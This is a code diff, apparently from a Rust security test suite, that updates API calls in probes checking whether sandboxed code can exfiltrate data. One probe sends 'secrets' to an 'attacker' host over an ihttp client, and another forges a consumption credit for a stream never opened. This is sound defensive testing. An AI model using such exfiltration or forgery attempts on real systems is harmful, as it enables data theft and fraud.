@@ -30,12 +30,23 @@ pub fn through_the_sdk() {
         headers: vec![],
         body: b"secrets".to_vec(),
     };
-    ihttp::Client::new(attacker).call(out, |_: &mut Exfil, r| report("ihttp_call", &answer(&r)));
+    let _call = ihttp::Client::new(attacker, ihttp::Transport::Relay)
+        .call(out, |_: &mut Exfil, r| report("ihttp_call", &answer(&r)));
     let routes = vec![Route {
         method: HttpMethod::Get,
         path: "/".into(),
     }];
-    probe::<Exfil, _>("ihttp_serve", ihttp::serve(routes, sink));
+    probe::<Exfil, _>(
+        "ihttp_serve",
+        ihttp::serve(
+            routes,
+            ihttp::ServeOn {
+                relay: true,
+                p2p: false,
+            },
+            sink,
+        ),
+    );
     // Credit for a stream it never opened, holding neither ihttp capability.
     let forged = IhttpConsumed {
         peer: Caller {
